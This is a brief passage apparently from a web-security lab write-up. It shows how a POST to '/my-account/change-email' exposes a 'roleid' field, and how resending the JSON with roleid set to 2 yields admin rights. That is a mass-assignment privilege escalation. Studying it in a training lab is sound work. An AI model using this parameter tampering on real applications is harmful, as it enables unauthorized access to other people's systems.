We can observe that the `POST` request to `/my-account/change-email` from the application returns.
```
{
  "username": "wiener",
  "email": "admin@dontwannacry.com",
  "apikey": "zGZt1abEVMvagJ5kxC4ZAGcaE1tamky6",
  "roleid": 1
}
```
Puting this information into an request gives us the admin role
```
{
  "username": "wiener",
  "email": "admin@dontwannacry.com",
  "apikey": "zGZt1abEVMvagJ5kxC4ZAGcaE1tamky6",
  "roleid": 2
}
```
